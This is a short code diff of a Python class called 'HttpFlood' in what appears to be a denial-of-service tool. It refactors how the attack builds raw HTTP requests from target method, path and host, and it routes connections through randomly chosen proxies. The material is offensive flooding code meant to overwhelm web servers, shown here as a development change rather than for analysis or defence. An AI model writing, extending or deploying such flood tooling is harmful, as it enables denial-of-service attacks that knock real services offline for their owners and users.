@@ -21,7 +21,6 @@ class HttpFlood(AttackMethod):
     name: str = 'HTTP Flood'
     label: str = 'http-flood'
 
-    _http_method: str
     _target: Target
     _ctx: Context
     _proxy: Any = None
@@ -30,7 +29,6 @@ class HttpFlood(AttackMethod):
     def __init__(self, target: Target, context: Context):
         self._target = target
         self._ctx = context
-        self._http_method = context.http_method
 
     def create_connection(self):
         self._proxy = self._ctx.proxy_manager.get_random_proxy()
@@ -86,9 +84,9 @@ class HttpFlood(AttackMethod):
         headers = '\r\n'.join([f'{key}: {value}' for (key, value) in self.headers(body).items()])
 
         request = '{} {} HTTP/1.1\r\nHost: {}\r\n{}\r\n{}'.format(
-            self._http_method.upper(),
-            self._ctx.target.http_path,
-            self._ctx.target.host,
+            self._target.http_method.upper(),
+            self._target.http_path,
+            self._target.host,
             headers,
             body_content
         )
